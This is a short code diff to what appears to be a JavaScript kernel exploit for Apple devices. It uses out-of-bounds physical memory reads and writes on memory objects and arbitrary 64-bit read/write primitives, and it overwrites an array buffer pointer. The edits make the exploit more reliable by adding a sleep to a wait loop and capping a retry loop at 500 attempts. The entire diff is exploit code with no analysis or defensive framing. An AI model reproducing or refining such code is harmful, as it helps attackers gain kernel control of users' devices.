@@ -355,6 +355,7 @@
       if (isFinished == 1n) {
         break;
       }
+      usleep(1000n);
     }
     object_release(nsthread);
     uwrite64(uread64(objectForKeyedSubscript(js_ctx, cfstr_rw_array) + 0x8n) + 0x10n, js_thread["rw_array_buffer_bk"]);
@@ -801,12 +802,13 @@
     return KERN_SUCCESS;
   }
   function physical_oob_read_mo_with_retry(memory_object, seeking_offset, oob_size, oob_offset, read_buffer) {
-    while (true) {
+    for (let attempt = 0; attempt < 500; attempt++) {
       kr = physical_oob_read_mo(memory_object, seeking_offset, oob_size, oob_offset, read_buffer);
       if (kr == KERN_SUCCESS) {
-        break;
+        return;
       }
     }
+    LOG("[-] physical_oob_read_mo_with_retry exhausted after 500 attempts");
   }
   function physical_oob_write_mo(mo, mo_offset, size, offset, buffer) {
     uwrite64(target_object_sync_ptr, mo);
